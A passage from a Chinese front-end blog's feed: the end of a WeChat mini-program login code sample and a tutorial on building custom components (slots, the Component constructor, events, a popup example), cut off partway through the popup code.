class="string">''</span>,  <span class="comment">// 语言, "zh_TW"</span></span><br><span class="line">                            gender : res.userInfo.gender,</span><br><span class="line">                            geo: &#123;</span><br><span class="line">                                country: res.userInfo.country,</span><br><span class="line">                                province: res.userInfo.province,</span><br><span class="line">                                city: res.userInfo.city</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    API.profile.update(params, (d) =&gt; &#123;</span><br><span class="line">                        <span class="comment">// 静默注册</span></span><br><span class="line">                        <span class="keyword">if</span>(d.code === <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                wx.setStorageSync(<span class="string">'USERINFO.'</span>+ <span class="keyword">this</span>.globalData.viewerId, <span class="keyword">this</span>.globalData.userInfo);</span><br><span class="line">                                wx.setStorageSync(<span class="string">'REGISTED.'</span>+ <span class="keyword">this</span>.globalData.viewerId, (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime());</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">        </span><br><span class="line">                            callback();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;, &#123;</span><br><span class="line">                        ignoreError: <span class="literal">true</span></span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;,</span><br><span class="line">                fail: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">'get user info failed: not authorized.'</span>, <span class="built_in">arguments</span>);</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment">// 强制弹一次授权</span></span><br><span class="line">                    <span class="keyword">if</span> (needTry) &#123;</span><br><span class="line">                        wx.openSetting(&#123;</span><br><span class="line">                            success: <span class="function">(<span class="params">res</span>)=&gt;</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (res.authSetting[<span class="string">'scope.userInfo'</span>]) &#123;</span><br><span class="line">                                    wx.showToast(&#123;</span><br><span class="line">                                        title: LANG.AuthorizeSuccess,</span><br><span class="line">                                        duration: CONFIG.SHOWTOAST_DURATION,</span><br><span class="line">                                    &#125;);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;,</span><br><span class="line">                            fail: <span class="function">(<span class="params">res</span>)=&gt;</span> &#123;</span><br><span class="line">                                <span class="built_in">console</span>.log(<span class="string">'user not permit to authorize.'</span>, <span class="built_in">arguments</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                withCredentials: <span class="literal">false</span><span class="comment">// 不包含openid 等敏感信息</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">    init: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.login(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="comment">// 塞入常规环境数据</span></span><br><span class="line">            <span class="keyword">let</span> pageInstance = <span class="keyword">this</span>.getCurrentPageInstance(),</span><br><span class="line">                context, screenWidth, screenHeight;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*if (this.globalData.device.system_info) &#123;</span></span><br><span class="line"><span class="comment">                screenWidth = this.globalData.device.system_info.screen_width;</span></span><br><span class="line"><span class="comment">                screenHeight = this.globalData.device.system_info.screen_height;</span></span><br><span class="line"><span class="comment">            &#125; else &#123;</span></span><br><span class="line"><span class="comment">                let systemInfo = wx.getSystemInfoSync();</span></span><br><span class="line"><span class="comment">                if (systemInfo) &#123;</span></span><br><span class="line"><span class="comment">                    screenWidth = systemInfo.screenWidth;</span></span><br><span class="line"><span class="comment">                    screenHeight = systemInfo.screenHeight;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">            &#125;*/</span></span><br><span class="line">            context = &#123;</span><br><span class="line">                LANG: LANG,</span><br><span class="line">                CDN: CONFIG.CDN_HOST,</span><br><span class="line">                isNoContent: <span class="literal">false</span>,</span><br><span class="line">                HashtagType: CONFIG.HashtagType,</span><br><span class="line">                VerbType: CONFIG.VerbType,</span><br><span class="line">                GridImageWidthMode: CONFIG.GridImageWidthMode,</span><br><span class="line">                STICKER_MAKER_ENABLED: CONFIG.STICKER_MAKER_ENABLED,</span><br><span class="line">                UGC_ENABLED: CONFIG.UGC_ENABLED,</span><br><span class="line">                UGC_IMAGE_COUNT_LIMIT: CONFIG.UGC_IMAGE_COUNT_LIMIT,</span><br><span class="line">                ReviewStateText: CONFIG.ReviewStateText,</span><br><span class="line"></span><br><span class="line">                networkType: <span class="keyword">this</span>.globalData.device.network ? <span class="keyword">this</span>.globalData.device.network.network_type : NetworkType.UNKNOWN,</span><br><span class="line"></span><br><span class="line">                IS_DEV: CONFIG.IS_DEV,</span><br><span class="line">                IS_SHOW_CONSOLE: CONFIG.IS_SHOW_CONSOLE,</span><br><span class="line">                DEBUG_DATA: [],</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 全部配置都放开读</span></span><br><span class="line">                CONFIG: CONFIG,</span><br><span class="line"></span><br><span class="line">                videoPlayStatus: &#123;&#125;,</span><br><span class="line">                </span><br><span class="line">                CURRENT_PAGE: pageInstance.data.PAGE,</span><br><span class="line"></span><br><span class="line">                hideVideo: <span class="literal">false</span>,  <span class="comment">// 因为小程序中video不能被任何元素遮挡，所以增加此变量，用于一些浮层展示时，隐藏视频</span></span><br><span class="line">                </span><br><span class="line">                updated_time: (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime()  <span class="comment">// 页面上次更新时间</span></span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            pageInstance.setData(&#123;</span><br><span class="line">                context: context</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.sendLaunchEvent();</span><br><span class="line"></span><br><span class="line">            callback &amp;&amp; callback();</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、登录流程&quot;&gt;&lt;a href=&quot;#一、登录流程&quot; class=&quot;headerlink&quot; title=&quot;一、登录流程&quot;&gt;&lt;/a&gt;一、登录流程&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_image
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="小程序" scheme="http://blog.poetries.top/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>小程序之自定义组件</title>
    <link href="http://blog.poetries.top/2018/08/12/wx-component/"/>
    <id>http://blog.poetries.top/2018/08/12/wx-component/</id>
    <published>2018-08-12T15:43:20.000Z</published>
    <updated>2018-08-23T01:41:37.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、创建自定义组件"><a href="#一、创建自定义组件" class="headerlink" title="一、创建自定义组件"></a>一、创建自定义组件</h2><blockquote><p>类似于页面，一个自定义组件由 <code>json</code> <code>wxml</code> <code>wxss</code> <code>js</code> 4个文件组成。要编写一个自定义组件，首先需要在 json 文件中进行自定义组件声明（将 component 字段设为 true 可这一组文件设为自定义组件）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;component&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二、使用自定义组件"><a href="#二、使用自定义组件" class="headerlink" title="二、使用自定义组件"></a>二、使用自定义组件</h2><blockquote><p>使用已注册的自定义组件前，首先要在页面的 json 文件中进行引用声明。此时需要提供每个自定义组件的标签名和对应的自定义组件文件路径</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"usingComponents"</span>: &#123;</span><br><span class="line">    <span class="string">"component-tag-name"</span>: <span class="string">"path/to/the/custom/component"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这样，在页面的 wxml 中就可以像使用基础组件一样使用自定义组件。节点名即自定义组件的标签名，节点属性即传递给组件的属性值。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;view&gt;</span><br><span class="line">  &lt;!-- 以下是对一个自定义组件的引用 --&gt;</span><br><span class="line">  &lt;component-tag-name inner-text=&quot;Some text&quot;&gt;&lt;/component-tag-name&gt;</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><h2 id="三、组件模版"><a href="#三、组件模版" class="headerlink" title="三、组件模版"></a>三、组件模版</h2><ul><li>在组件模板中可以提供一个 <code>&lt;slot&gt;</code>节点，用于承载组件引用时提供的子节点</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 组件模板 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span>&gt;</span>这里是组件的内部节点<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引用组件的页面模版 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">component-tag-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 这部分内容将被放置在组件 &lt;slot&gt; 的位置上 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>这里是插入到组件slot中的内容<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">component-tag-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>模版数据绑定</strong></p><blockquote><p>可以使用数据绑定，这样就可以向子组件的属性传递动态数据</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引用组件的页面模版 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">component-tag-name</span> <span class="attr">prop-a</span>=<span class="string">"&#123;&#123;dataFieldA&#125;&#125;"</span> <span class="attr">prop-b</span>=<span class="string">"&#123;&#123;dataFieldB&#125;&#125;"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 这部分内容将被放置在组件 &lt;slot&gt; 的位置上 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span>&gt;</span>这里是插入到组件slot中的内容<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">component-tag-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>组件wxml的slot</strong></p><ul><li>在组件的<code>wxml</code>中可以包含 <code>slot</code> 节点，用于承载组件使用者提供的<code>wxml</code>结构。</li><li>默认情况下，一个组件的<code>wxml</code>中只能有一个<code>slot</code>。需要使用多<code>slot</code>时，可以在组件js中声明启用</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Component(&#123;</span><br><span class="line">  options: &#123;</span><br><span class="line">    multipleSlots: <span class="literal">true</span> <span class="comment">// 在组件定义时的选项中启用多slot支持</span></span><br><span class="line">  &#125;,</span><br><span class="line">  properties: &#123; <span class="comment">/* ... */</span> &#125;,</span><br><span class="line">  methods: &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>此时，可以在这个组件的wxml中使用多个slot，以不同的 name 来区分</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 组件模板 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">"before"</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span>&gt;</span>这里是组件的内部细节<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">"after"</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>使用时，用 slot 属性来将节点插入到不同的slot上</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引用组件的页面模版 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">component-tag-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 这部分内容将被放置在组件 &lt;slot name="before"&gt; 的位置上 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">slot</span>=<span class="string">"before"</span>&gt;</span>这里是插入到组件slot name="before"中的内容<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 这部分内容将被放置在组件 &lt;slot name="after"&gt; 的位置上 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">slot</span>=<span class="string">"after"</span>&gt;</span>这里是插入到组件slot name="after"中的内容<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">component-tag-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="四、Component构造器"><a href="#四、Component构造器" class="headerlink" title="四、Component构造器"></a>四、Component构造器</h2><blockquote><p>Component构造器可用于定义组件，调用Component构造器时可以指定组件的属性、数据、方法等</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Component(&#123;</span><br><span class="line"></span><br><span class="line">  behaviors: [],</span><br><span class="line"></span><br><span class="line">  properties: &#123;</span><br><span class="line">    myProperty: &#123; <span class="comment">// 属性名</span></span><br><span class="line">      type: <span class="built_in">String</span>, <span class="comment">// 类型（必填），目前接受的类型包括：String, Number, Boolean, Object, Array, null（表示任意类型）</span></span><br><span class="line">      value: <span class="string">''</span>, <span class="comment">// 属性初始值（可选），如果未指定则会根据类型选择一个</span></span><br><span class="line">      observer: <span class="function"><span class="keyword">function</span>(<span class="params">newVal, oldVal, changedPath</span>) </span>&#123;</span><br><span class="line">         <span class="comment">// 属性被改变时执行的函数（可选），也可以写成在methods段中定义的方法名字符串, 如：'_propertyChange'</span></span><br><span class="line">         <span class="comment">// 通常 newVal 就是新设置的数据， oldVal 是旧数据</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    myProperty2: <span class="built_in">String</span> <span class="comment">// 简化的定义方式</span></span><br><span class="line">  &#125;,</span><br><span class="line">  data: &#123;&#125;, <span class="comment">// 私有数据，可用于模版渲染</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生命周期函数，可以为函数，或一个在methods段中定义的方法名</span></span><br><span class="line">  attached: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,</span><br><span class="line">  moved: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,</span><br><span class="line">  detached: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,</span><br><span class="line"></span><br><span class="line">  methods: &#123;</span><br><span class="line">    onMyButtonTap: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.setData(&#123;</span><br><span class="line">        <span class="comment">// 更新属性和数据的方法与更新页面数据的方法类似</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 内部方法建议以下划线开头</span></span><br><span class="line">    _myPrivateMethod: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="comment">// 这里将 data.A[0].B 设为 'myPrivateData'</span></span><br><span class="line">      <span class="keyword">this</span>.setData(&#123;</span><br><span class="line">        <span class="string">'A[0].B'</span>: <span class="string">'myPrivateData'</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    _propertyChange: <span class="function"><span class="keyword">function</span>(<span class="params">newVal, oldVal</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>在 properties 定义段中，属性名采用驼峰写法（propertyName）；</li><li>在 wxml 中，指定属性值时则对应使用连字符写法（<code>component-tag-name property-name=&quot;attr value&quot;</code>），应用于数据绑定时采用驼峰写法（<code>attr=&quot;&quot;</code>）</li></ul><h2 id="五、组件间通信与事件"><a href="#五、组件间通信与事件" class="headerlink" title="五、组件间通信与事件"></a>五、组件间通信与事件</h2><p><strong>组件间通信</strong></p><blockquote><p>组件间的基本通信方式有以下几种。</p></blockquote><ul><li>WXML 数据绑定：用于父组件向子组件的指定属性设置数据</li><li>事件：用于子组件向父组件传递数据，可以传递任意数据。</li><li>如果以上两种方式不足以满足需要，父组件还可以通过 <code>this.selectComponent</code> 方法获取子组件实例对象，这样就可以直接访问组件的任意数据和方法</li></ul><p><strong>监听事件</strong></p><ul><li>自定义组件可以触发任意的事件，引用组件的页面可以监听这些事件</li><li>监听自定义组件事件的方法与监听基础组件事件的方法完全一致</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 当自定义组件触发“myevent”事件时，调用“onMyEvent”方法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">component-tag-name</span> <span class="attr">bindmyevent</span>=<span class="string">"onMyEvent"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 或者可以写成 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">component-tag-name</span> <span class="attr">bind:myevent</span>=<span class="string">"onMyEvent"</span> /&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Page(&#123;</span><br><span class="line">  onMyEvent: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    e.detail <span class="comment">// 自定义组件触发事件时提供的detail对象</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>触发事件</strong></p><blockquote><p>自定义组件触发事件时，需要使用 <code>triggerEvent</code> 方法，指定事件名、<code>detail</code>对象和事件选项</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在自定义组件中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">bindtap</span>=<span class="string">"onTap"</span>&gt;</span>点击这个按钮将触发“myevent”事件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Component(&#123;</span><br><span class="line">  properties: &#123;&#125;</span><br><span class="line">  methods: &#123;</span><br><span class="line">    onTap: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> myEventDetail = &#123;&#125; <span class="comment">// detail对象，提供给事件监听函数</span></span><br><span class="line">      <span class="keyword">var</span> myEventOption = &#123;&#125; <span class="comment">// 触发事件的选项</span></span><br><span class="line">      <span class="keyword">this</span>.triggerEvent(<span class="string">'myevent'</span>, myEventDetail, myEventOption)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="六、自定义组件案例"><a href="#六、自定义组件案例" class="headerlink" title="六、自定义组件案例"></a>六、自定义组件案例</h2><blockquote><p>实现一个弹框</p></blockquote><ul><li>在component下新建popup文件夹</li></ul><p><img src="https://user-gold-cdn.xitu.io/2018/3/14/16223cc683fa5afc?w=295&amp;h=676&amp;f=png&amp;s=15505" alt=""></p><p>popup.wxml</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">"wx-popup"</span> <span class="attr">hidden</span>=<span class="string">"&#123;&#123;flag&#125;&#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">'popup-container'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">"wx-popup-title"</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">"wx-popup-con"</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">"wx-popup-btn"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">"btn-no"</span> <span class="attr">bindtap</span>=<span class="string">'_error'</span>&gt;</span>&#123;&#123;btn_no&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">"btn-ok"</span> <span class="attr">bindtap</span>=<span class="string">'_success'</span>&gt;</span>&#123;&#123;btn_ok&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>popup.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Component(&#123;</span><br><span class="line">  options: &#123;</span><br><span class="line">    multipleSlots: <span class="literal">true</span> <span class="comment">// 在组件定义时的选项中启用多slot支持</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 组件的属性列表</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  properties: &#123;</span><br><span class="line">    title: &#123;            <span class="comment">// 属性名</span></span><br><span class="line">      type: <span class="built_in">String</span>,     <span class="comment">// 类型（必填），目前接受的类型包括：String, Number, Boolean, Object, Array, null（表示任意类型）</span></span><br><span class="line">      value: <span class="string">'标题'</span>     <span class="comment">// 属性初始值（可选），如果未指定则会根据类型选择一个</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 弹窗内容</span></span><br><span class="line">    content: &#123;</span><br><span class="line">      type: <span class="built_in">String</span>,</span><br><span class="line">      value: <span class="string">'内容'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 弹窗取消按钮文字</span></span><br><span class="line">    btn_no: &#123;</span><br><span class="line">      type: <span class="built_in">String</span>,</span><br><span class="line">      value: <span class="string">'取消'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 弹窗确认按钮文字</span></span><br><span class="line">    btn_ok: &#123;</span><br><span class="line">      type: <span class="built_in">String</span>,</span><br><span class="line">      value: <span class="string">'确定'</span></span><br><span class="line">    &#125; </span><br><span class="line">  &#125;,</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 组件的初始数据</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  data: &#123;</span><br><span class="line">    flag: <span class="literal">true</span>,</span><br><span class="line">  &#125;,</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 组件的方法列表</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  methods: &#123;</span><br><span class="line">    <span class="comment">//隐藏弹框</span></span><br><span class="line">    hidePopup: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.setData(&#123;</span><br><span class="line">        flag: !<span class="keyword">this</span>.data.flag</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span 